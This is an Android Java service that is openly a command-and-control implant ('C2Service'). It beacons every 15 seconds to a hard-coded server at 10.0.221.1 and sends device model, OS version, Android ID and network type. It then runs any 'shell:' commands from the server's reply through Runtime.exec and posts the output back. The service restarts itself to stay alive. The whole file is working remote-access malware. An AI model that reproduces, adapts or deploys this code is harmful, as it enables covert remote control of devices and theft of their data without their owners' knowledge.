package com.c2.agent;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class C2Service extends Service {
    private static final String TAG = "C2Agent";
    private static final String C2_BEACON = "http://10.0.221.1:80/beacon.php";
    private static final String C2_RESULTS = "http://10.0.221.1:80/results.php";
    private static final long BEACON_INTERVAL = 15;
    private static boolean running = false;
    private ScheduledExecutorService scheduler;

    public static boolean isRunning() { return running; }
    @Override public void onCreate() {
        super.onCreate(); running = true;
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::beacon, 2, BEACON_INTERVAL, TimeUnit.SECONDS);
    }
    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() {
        running = false;
        if (scheduler != null && !scheduler.isShutdown()) scheduler.shutdown();
        super.onDestroy();
    }
    private void beacon() {
        try {
            String data = collectDeviceInfo();
            String response = httpPost(C2_BEACON, data);
            if (response != null && response.contains("commands")) {
                int start = response.indexOf("shell:");
                while (start != -1) {
                    int end = response.indexOf("\"", start + 6);
                    if (end == -1) break;
                    String cmd = response.substring(start, end);
                    executeCommand(cmd);
                    start = response.indexOf("shell:", end);
                }
            }
        } catch (Exception e) { Log.e(TAG, "Beacon: " + e.getMessage()); }
    }
    private String collectDeviceInfo() {
        StringBuilder info = new StringBuilder();
        info.append("device=").append(urlEncode(Build.DEVICE));
        info.append("&model=").append(urlEncode(Build.MODEL));
        info.append("&brand=").append(urlEncode(Build.BRAND));
        info.append("&release=").append(urlEncode(Build.VERSION.RELEASE));
        info.append("&sdk=").append(Build.VERSION.SDK_INT);
        info.append("&id=").append(urlEncode(Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID)));
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        info.append("&network=").append(urlEncode(netInfo != null && netInfo.isConnected() ? netInfo.getTypeName() : "NONE"));
        return info.toString();
    }
    private void executeCommand(String cmd) {
        try {
            String output;
            if (cmd.startsWith("shell:")) output = runShellCommand(cmd.substring(6));
            else output = "Unknown: " + cmd;
            httpPost(C2_RESULTS, "id=" + urlEncode(Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID)) + "&output=" + urlEncode(output));
        } catch (Exception e) { Log.e(TAG, "Exec: " + e.getMessage()); }
    }
    private String runShellCommand(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder out = new StringBuilder(); String line;
            while ((line = r.readLine()) != null) out.append(line).append("\n");
            p.waitFor(); return out.toString().trim();
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }
    private String httpPost(String urlStr, String data) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setDoOutput(true);
        conn.setConnectTimeout(8000); conn.setReadTimeout(8000);
        OutputStream os = conn.getOutputStream();
        os.write(data.getBytes("UTF-8")); os.flush(); os.close();
        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder response = new StringBuilder(); String line;
        while ((line = reader.readLine()) != null) response.append(line);
        reader.close(); return response.toString();
    }
    private String urlEncode(String s) {
        try { return URLEncoder.encode(s, "UTF-8"); } catch (Exception e) { return s; }
    }
}
